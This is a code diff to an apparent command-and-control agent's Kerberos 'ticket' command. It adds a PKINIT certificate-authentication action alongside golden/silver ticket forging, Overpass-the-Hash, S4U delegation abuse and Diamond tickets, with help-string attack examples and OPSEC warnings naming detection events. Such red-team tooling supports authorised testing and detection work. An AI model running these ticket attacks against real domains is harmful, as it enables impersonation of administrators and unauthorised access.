@@ -11,11 +11,11 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "ticket",
-		Description:         "Forge, request, renew, or delegate Kerberos tickets. Forge: Golden/Silver Tickets from extracted keys (offline). Request: Overpass-the-Hash AS exchange with KDC (online). S4U: Constrained delegation abuse via S4U2Self+S4U2Proxy. Diamond: Real AS exchange + ticket modification (evasion). Renew: Extend TGT lifetime. Outputs kirbi or ccache format.",
-		HelpString:          "ticket -action forge -realm CORP.LOCAL -username Administrator -domain_sid S-1-5-21-... -key <hex_aes256_key>\nticket -action request -realm CORP.LOCAL -username admin -key <hex_key> -server dc01.corp.local\nticket -action diamond -realm CORP.LOCAL -username jsmith -key <user_key> -krbtgt_key <krbtgt_key> -server dc01.corp.local -target_user Administrator\nticket -action renew -realm CORP.LOCAL -server dc01.corp.local -ticket <base64_kirbi>\nticket -action s4u -realm CORP.LOCAL -username sqlsvc -key <hex_key> -server dc01.corp.local -impersonate Administrator -spn cifs/fileserver.corp.local",
+		Description:         "Forge, request, renew, or delegate Kerberos tickets. Forge: Golden/Silver Tickets from extracted keys (offline). Request: Overpass-the-Hash AS exchange with KDC (online). S4U: Constrained delegation abuse via S4U2Self+S4U2Proxy. Diamond: Real AS exchange + ticket modification (evasion). Renew: Extend TGT lifetime. PKINIT: Certificate-based authentication (from ADCS/Shadow Creds). Outputs kirbi or ccache format.",
+		HelpString:          "ticket -action forge -realm CORP.LOCAL -username Administrator -domain_sid S-1-5-21-... -key <hex_aes256_key>\nticket -action request -realm CORP.LOCAL -username admin -key <hex_key> -server dc01.corp.local\nticket -action diamond -realm CORP.LOCAL -username jsmith -key <user_key> -krbtgt_key <krbtgt_key> -server dc01.corp.local -target_user Administrator\nticket -action renew -realm CORP.LOCAL -server dc01.corp.local -ticket <base64_kirbi>\nticket -action s4u -realm CORP.LOCAL -username sqlsvc -key <hex_key> -server dc01.corp.local -impersonate Administrator -spn cifs/fileserver.corp.local\nticket -action pkinit -realm CORP.LOCAL -username admin -server dc01.corp.local -certificate <pem> -private_key <pem>",
 		Version:             1,
 		Author:              "@galoryber",
-		MitreAttackMappings: []string{"T1558.001", "T1558.002", "T1550.002", "T1550.003", "T1134.001", "T1550.001"},
+		MitreAttackMappings: []string{"T1558.001", "T1558.002", "T1550.002", "T1550.003", "T1134.001", "T1550.001", "T1649"},
 		AssociatedBrowserScript: &agentstructs.BrowserScript{
 			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "ticket_new.js"),
 			Author:     "@galoryber",
@@ -32,9 +32,9 @@ func init() {
 				Name:             "action",
 				CLIName:          "action",
 				ModalDisplayName: "Action",
-				Description:      "Action: forge (offline ticket creation), request (Overpass-the-Hash), diamond (real AS exchange + modification), renew (extend TGT lifetime), s4u (constrained delegation)",
+				Description:      "Action: forge (offline ticket creation), request (Overpass-the-Hash), diamond (real AS exchange + modification), renew (extend TGT lifetime), s4u (constrained delegation), pkinit (certificate-based auth)",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:          []string{"forge", "request", "s4u", "diamond", "renew"},
+				Choices:          []string{"forge", "request", "s4u", "diamond", "renew", "pkinit"},
 				DefaultValue:     "forge",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{ParameterIsRequired: true, GroupName: "Default"},
@@ -229,6 +229,28 @@ func init() {
 					{ParameterIsRequired: false, GroupName: "Default"},
 				},
 			},
+			{
+				Name:             "certificate",
+				CLIName:          "certificate",
+				ModalDisplayName: "Certificate (PEM)",
+				Description:      "PKINIT: PEM-encoded X.509 certificate with Smart Card Logon or Client Authentication EKU. Obtained from ADCS certificate request or Shadow Credentials.",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
+			{
+				Name:             "private_key",
+				CLIName:          "private_key",
+				ModalDisplayName: "Private Key (PEM)",
+				Description:      "PKINIT: PEM-encoded private key matching the certificate. Supports RSA (PKCS#1/PKCS#8) and EC keys.",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
 		},
 		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
 			if input == "" {
@@ -256,6 +278,8 @@ func init() {
 				impersonate, _ := taskData.Args.GetStringArg("impersonate")
 				spn, _ := taskData.Args.GetStringArg("spn")
 				msg = fmt.Sprintf("OPSEC WARNING: S4U2 constrained delegation abuse (T1550.003). Impersonating %s to %s. S4U generates TGS-REQ with PA-FOR-USER padata (type 129) and cname-in-addl-tkt flag — both are high-fidelity detection signals. Event 4769 with Transited Services field populated indicates delegation chain.", impersonate, spn)
+			case "pkinit":
+				msg = "OPSEC WARNING: PKINIT certificate-based authentication (T1558.004). AS-REQ with PA-PK-AS-REQ padata (type 16) — uses DH key exchange and CMS SignedData. Event 4768 logged with Certificate Information fields populated. Certificate thumbprint and issuer are recorded. Smart Card Logon events (4624 type 11) may also fire."
 			}
 			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
 				TaskID: taskData.Task.ID, Success: true,
@@ -304,6 +328,9 @@ func init() {
 			case "s4u":
 				displayMsg = fmt.Sprintf("S4U delegation: %s → %s for %s via %s", username, impersonate, spn, server)
 				artifactMsg = fmt.Sprintf("Kerberos S4U2Self+S4U2Proxy: %s impersonating %s for %s to %s", username, impersonate, spn, server)
+			case "pkinit":
+				displayMsg = fmt.Sprintf("PKINIT: %s@%s via %s (certificate auth)", username, realm, server)
+				artifactMsg = fmt.Sprintf("PKINIT AS-REQ (certificate-based) for %s@%s to %s", username, realm, server)
 			default:
 				var ticketType string
 				if spn == "" {
@@ -367,6 +394,14 @@ func init() {
 					logOperationEvent(processResponse.TaskData.Task.ID,
 						fmt.Sprintf("[DELEGATION] S4U2Self+S4U2Proxy: impersonated %s → %s", impersonate, spn), true)
 				}
+			case "pkinit":
+				if strings.Contains(responseText, "PKINIT AS exchange successful") {
+					username, _ := processResponse.TaskData.Args.GetStringArg("username")
+					tagTask(processResponse.TaskData.Task.ID, "CREDENTIAL",
+						fmt.Sprintf("PKINIT TGT obtained for %s via certificate auth (T1558.004)", username))
+					logOperationEvent(processResponse.TaskData.Task.ID,
+						fmt.Sprintf("[PKINIT] Certificate-based TGT obtained for %s", username), true)
+				}
 			}
 			return response
 		},
@@ -389,6 +424,8 @@ func classifyTicketType(action, spn string) string {
 		return "TGT Renewal"
 	case "s4u":
 		return "S4U Delegation"
+	case "pkinit":
+		return "PKINIT (Certificate Auth)"
 	default:
 		return "Kerberos Ticket"
 	}
